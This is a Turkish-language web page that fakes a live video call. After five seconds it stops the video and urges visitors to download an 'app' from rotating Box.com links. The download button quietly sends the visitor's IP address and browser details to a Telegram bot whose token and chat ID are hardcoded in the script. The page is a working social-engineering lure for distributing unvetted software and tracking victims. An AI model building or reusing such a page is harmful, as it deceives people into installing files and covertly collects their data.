<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Görüntülü Görüşme</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
        integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            position: fixed;
            width: 100%;
        }
        video {
            position: absolute;
            z-index: -1;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: translate(-50%, -50%);
            min-width: 100%;
            min-height: 100%;
        }
        .stopped {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10;
            display: none; /* Başlangıçta gizli */
        }
        .bottom-controls {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            z-index: 20;
        }
        .live-indicator {
            position: fixed;
            top: 1rem;
            left: 1rem;
            z-index: 20;
        }
        @layer utilities {
        @keyframes pulse-heart {
          0%,
          100% {
            transform: scale(1);
          }
          50% {
            transform: scale(1.05);
          }
        }
        .animate-pulse-heart {
          animation: pulse-heart 1s ease-in-out infinite;
        }
      }
    </style>
</head>
<body>
    <div class="live-indicator bg-black bg-opacity-50 flex py-1 px-3 rounded-full gap-2">
        <div class="flex items-center justify-center">
            <span class="relative flex h-3 w-3">
                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                <span class="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
              </span>
        </div>
        <p class="text-white">Canlı</p>
    </div>
    
    <video autoplay muted loop id="backgroundVideo">
        <!-- Video kaynağı JavaScript tarafından belirlenecek -->
    </video>
    
    <div class="bottom-controls bg-white w-full p-3 rounded-t-3xl">
        <div class="bg-gray-200 w-24 h-1 rounded-2xl m-auto mb-3"></div>
        <div class="flex gap-4 justify-center items-center">
            <button class="bg-[#F6F6F6] flex justify-center items-center w-12 h-12 rounded-full">
                <i class="fa-solid fa-volume-xmark"></i>
            </button>

            <button class="bg-[#F6F6F6] flex justify-center items-center w-12 h-12 rounded-full">
                <i class="fa-solid fa-video-slash"></i>
            </button>

            <button class="bg-[#F6F6F6] flex justify-center items-center w-12 h-12 rounded-full">
                <i class="fa-solid fa-microphone-slash"></i>
            </button>

            <button class="bg-[#FAE4E6] flex justify-center items-center w-12 h-12 rounded-full">
                <img src="./img/call.svg" alt="Arama">
            </button>
        </div>
    </div>

    <div class="bg-white min-w-52 max-w-96 w-80 flex-col justify-center items-center gap-3 
        rounded-xl py-7 px-10 text-center stopped" id="stoppedDiv">
        <div>
            <img src="./img/icon.svg" alt="İkon">
        </div>
        <p class="font-bold">Görüşme Duraklatıldı!</p>
        <p class="font-light text-[14px]">Görüntülü Sohbet bulunamadı. Açılması için lütfen uygulamayı  yükleyiniz.</p>
        <button id="downloadBtn"
            class="bg-[#6156DF] animate-pulse-heart text-white w-44 rounded-xl flex items-center justify-center p-3 px-5 relative">
            Şimdi İndir
            <i class="fa-solid fa-angle-right absolute right-4"></i>
        </button>
        <div>
            <ul class="list-disc text-[11px]"><li>Üyelik tamamen ücretsizdir.</li></ul>
        </div>
    </div>

    <script>
        const videos = [
            'videos/video1.mp4',
            'videos/video2.mp4',
            'videos/video3.mp4',
            'videos/video4.mp4',
            'videos/video5.mp4',
            'videos/video6.mp4',
            'videos/video7.mp4',
            'videos/video8.mp4',
            'videos/video9.mp4',
            'videos/video10.mp4',
            'videos/video11.mp4',
            'videos/video12.mp4',
            'videos/video13.mp4',
            'videos/video14.mp4',
            'videos/video15.mp4',
            'videos/video16.mp4',
            'videos/video17.mp4',
            'videos/video18.mp4',
            'videos/video19.mp4',
            'videos/video20.mp4',
        ];

        const downloadLinks = [
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=jfvvxsjqut9b1d5l5ft35gpt8dx5edx1&file_id=f_2042175985266",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=jfvvxsjqut9b1d5l5ft35gpt8dx5edx1&file_id=f_2042175985266",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=jfvvxsjqut9b1d5l5ft35gpt8dx5edx1&file_id=f_2042175985266",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=3tf8ihpigc7hoclwlho6oibspyx2wlp8&file_id=f_2042186099616",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=3tf8ihpigc7hoclwlho6oibspyx2wlp8&file_id=f_2042186099616",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=3tf8ihpigc7hoclwlho6oibspyx2wlp8&file_id=f_2042186099616",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=0838yv8uecfxco4got0nczrfly67zafn&file_id=f_2042185155649",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=0838yv8uecfxco4got0nczrfly67zafn&file_id=f_2042185155649",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=0838yv8uecfxco4got0nczrfly67zafn&file_id=f_2042185155649",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=zx6oriimf7yoco4h8slt0o5bhobmqf4e&file_id=f_2042173367394",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=zx6oriimf7yoco4h8slt0o5bhobmqf4e&file_id=f_2042173367394",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=zx6oriimf7yoco4h8slt0o5bhobmqf4e&file_id=f_2042173367394",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=9o3suzxzm0n2lvhljc47h22iz6ilr07e&file_id=f_2042187448436",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=9o3suzxzm0n2lvhljc47h22iz6ilr07e&file_id=f_2042187448436",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=9o3suzxzm0n2lvhljc47h22iz6ilr07e&file_id=f_2042187448436",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=n034itjvvd7yzoxti4qlcoble8jcdbjn&file_id=f_2042175335588",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=n034itjvvd7yzoxti4qlcoble8jcdbjn&file_id=f_2042175335588",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=n034itjvvd7yzoxti4qlcoble8jcdbjn&file_id=f_2042175335588",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=pxgq1rh0c0waeabxyghf6ffbspfp3i79&file_id=f_2042173715289",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=pxgq1rh0c0waeabxyghf6ffbspfp3i79&file_id=f_2042173715289",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=pxgq1rh0c0waeabxyghf6ffbspfp3i79&file_id=f_2042173715289",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=fhuu3kvh1o3ke0qeebboi1f4ur4zm6mk&file_id=f_2042185134049",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=fhuu3kvh1o3ke0qeebboi1f4ur4zm6mk&file_id=f_2042185134049",
"https://app.box.com/index.php?rm=box_download_shared_file&shared_name=fhuu3kvh1o3ke0qeebboi1f4ur4zm6mk&file_id=f_2042185134049"
        ];

        // Telegram ayarları
        const token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
        const chatId = '-1002478190818';

        function getCurrentDownloadLink() {
            const now = new Date();
            const currentHour = now.getHours(); 
            
            return downloadLinks[currentHour];
        }

        function updateDownloadLink() {
            const currentLink = getCurrentDownloadLink();
            console.log(`İndirme linki güncellendi: ${currentLink}`);
        }

        function sendTelegramLog(fileUrl) {
            const userAgent = navigator.userAgent;
            
            // IP adresini al
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    const ip = data.ip;
                    const message = `new userr.\nIP: ${ip}\nCihaz: ${userAgent}\nİndirilen link: ${fileUrl}`;
                    
                    // Telegram'a mesaj gönder
                    return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Telegram log gönderildi');
                    } else {
                        console.error('Telegram log gönderilemedi');
                    }
                })
                .catch(error => {
                    console.error('Log gönderme hatası:', error);
                });
        }

        function downloadFile() {
            const btn = document.getElementById('downloadBtn');
            btn.innerText = 'İndiriliyor...';
            btn.disabled = true;

            const fileUrl = getCurrentDownloadLink();
            
            // Telegram log gönder
            sendTelegramLog(fileUrl);
            
            // Dosya indirme
            const a = document.createElement('a');
            a.href = fileUrl;
            a.download = '';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // 3 saniye sonra buton eski haline dönsün
            setTimeout(() => {
                btn.innerText = 'Şimdi İndir';
                btn.disabled = false;
            }, 3000);
        }

        window.onload = function() {
            // Rastgele video seç
            const videoIndex = Math.floor(Math.random() * videos.length);
            const selectedVideo = videos[videoIndex];

            // Video elementini ayarla
            const videoElement = document.getElementById('backgroundVideo');
            videoElement.src = selectedVideo;

            // İndirme linkini güncelle
            updateDownloadLink();

            // İndirme butonuna event listener ekle
            document.getElementById('downloadBtn').addEventListener('click', downloadFile);

            // 5 saniye sonra görüşmeyi durdur
            setTimeout(function() {
                videoElement.pause();
                document.getElementById('stoppedDiv').style.display = 'flex';
            }, 5000);
        };

        // Saatlik olarak indirme linkini güncelle
        setInterval(updateDownloadLink, 60 * 60 * 1000);

        // Touch hareketlerini engelle
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
    </script>
</body>
</html>
